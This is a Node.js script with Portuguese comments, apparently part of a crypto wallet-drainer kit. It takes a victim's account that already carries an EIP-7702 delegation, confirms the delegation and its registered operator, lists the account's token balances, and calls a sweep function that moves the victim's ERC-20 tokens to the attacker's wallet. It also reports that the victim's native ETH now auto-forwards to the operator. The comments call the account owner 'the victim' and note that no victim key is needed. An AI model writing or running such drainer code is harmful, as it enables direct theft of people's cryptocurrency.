/// Varre uma conta JA delegada por EIP-7702 (fluxo do front-end, sem a chave da vitima).
/// Uso: node ops/sweep7702.mjs 0xALVO [token ...]
/// Sem tokens informados, varre a lista monitorada do lib.mjs.
import { Contract, formatUnits, getAddress } from "ethers";
import { loadEnv, SWEEPER_ABI, ERC20_ABI, TOKENS } from "./lib.mjs";

const target = getAddress(process.argv[2] ?? "");
const { wallet, provider } = loadEnv();
if (!wallet) throw new Error("PRIVATE_KEY ausente");

const tokens = process.argv.length > 3 ? process.argv.slice(3).map(getAddress) : Object.values(TOKENS).map((t) => t.address);

const code = await provider.getCode(target);
if (!code.startsWith("0xef0100")) throw new Error(`conta nao esta delegada (code=${code.slice(0, 10)})`);
const delegate = "0x" + code.slice(8, 48);
const op = await new Contract(target, SWEEPER_ABI, provider).operator();
console.log(`alvo ${target}\ndelegado para ${delegate}\noperador registrado ${op}`);
if (op !== "0x0000000000000000000000000000000000000000" && getAddress(op) !== wallet.address) {
  console.log(`aviso: destino sera o operador ${op}, nao voce`);
}

const decimalsOf = (addr) => Object.values(TOKENS).find((t) => t.address === addr)?.decimals ?? 18;
for (const [symbol, meta] of Object.entries(TOKENS)) {
  const bal = await new Contract(meta.address, ERC20_ABI, provider).balanceOf(target);
  const eth = await provider.getBalance(target);
  if (bal > 0n || (symbol === "WETH" && eth > 0n)) console.log(`  ${symbol.padEnd(5)} ${formatUnits(bal, meta.decimals)}`);
}

const iface = new Contract(target, SWEEPER_ABI, provider).interface;
const data = iface.encodeFunctionData("sweep", [wallet.address, tokens, [], []]);
const tx = await wallet.sendTransaction({ to: target, data, gasLimit: 200_000 + 90_000 * tokens.length });
console.log(`tx ${tx.hash}`);
await tx.wait();

const after = await Promise.all(tokens.map((t) => new Contract(t, ERC20_ABI, provider).balanceOf(wallet.address)));
tokens.forEach((t, i) => {
  if (after[i] > 0n) console.log(`  recebido ${t} -> ${formatUnits(after[i], decimalsOf(t))}`);
});
console.log(`ETH nativo do alvo agora auto-forwarda para ${op}`);
